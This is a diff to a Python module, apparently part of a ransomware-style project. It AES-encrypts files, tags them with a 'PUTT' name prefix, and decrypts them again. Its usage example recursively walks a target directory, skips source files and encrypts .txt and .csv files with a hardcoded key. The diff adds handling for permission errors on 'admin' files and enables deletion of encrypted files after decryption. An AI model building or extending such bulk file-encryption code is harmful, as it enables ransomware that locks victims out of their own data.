@@ -2,9 +2,8 @@ from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
+from util import NAMED_CONVERSION
 import os
-
-NAMED_CONVERSION = "PUTT"
 
 
 def encrypt(key, filePath):
@@ -15,8 +14,17 @@ def encrypt(key, filePath):
 
     dataFile = str(filePath)
 
-    with open(dataFile, "rb") as infile:
-        data = infile.read()
+    data = "".encode()
+
+    try:
+        with open(dataFile, "rb") as infile:
+            data = infile.read()
+    except PermissionError:
+        # If we encountered an admin file don't do anything for now
+        print("PermissionError")
+    except Exception:
+        print("Other exception caught")
+        raise Exception
 
     (dir, fileName) = os.path.split(filePath)
 
@@ -78,33 +86,30 @@ def decrypt(key, filePath):
     with open(decrypted_file, "wb") as f:
         f.write(file_content)
 
-    # os.remove(filePath)  # Removes the encrypted file
+    os.remove(filePath)  # Removes the encrypted file
 
 
 # HOW TO USE EXAMPLE
-"""import util
-import hashlib
-
-EXCLUDE_FILES = ["requirements.txt", ".gitignore"]
-EXCLUDE_EXTENSIONS = [".py", ".md"]
-ONLY_ENCRYPT_EXTENSION = [".txt", ".csv"]
-
-directory = "target_dir"
-
-for item in util.scanDirRecursive(directory):
-    filePath = Path(item)
-
-    fileType = filePath.suffix.lower()
-
-    if fileType in EXCLUDE_EXTENSIONS:
-        continue
-    elif str(filePath) in EXCLUDE_FILES:
-        continue
-
-    key = hashlib.sha256("THIS IS MY KEY".encode()).digest()
-    # encrypt(key, filePath)
-    # if fileType in ONLY_ENCRYPT_EXTENSION:
-    #    encrypt(key, filePath)
-    # if f"{NAMED_CONVERSION}_" in str(filePath):
-    #    decrypt(key, filePath)
-"""
+# import util
+# import hashlib
+#
+# EXCLUDE_FILES = ["requirements.txt", ".gitignore"]
+# EXCLUDE_EXTENSIONS = [".py", ".md"]
+# ONLY_ENCRYPT_EXTENSION = [".txt", ".csv"]
+#
+# directory = "target_dir"
+#
+# for item in util.scanDirRecursive(directory):
+#    filePath = Path(item)
+#
+#    fileType = filePath.suffix.lower()
+#
+#    if fileType in EXCLUDE_EXTENSIONS:
+#        continue
+#    elif str(filePath) in EXCLUDE_FILES:
+#        continue
+#
+#    key = hashlib.sha256("THIS IS MY KEY".encode()).digest()
+#    #encrypt(key, filePath)
+#    if fileType in ONLY_ENCRYPT_EXTENSION:
+#       encrypt(key, filePath)
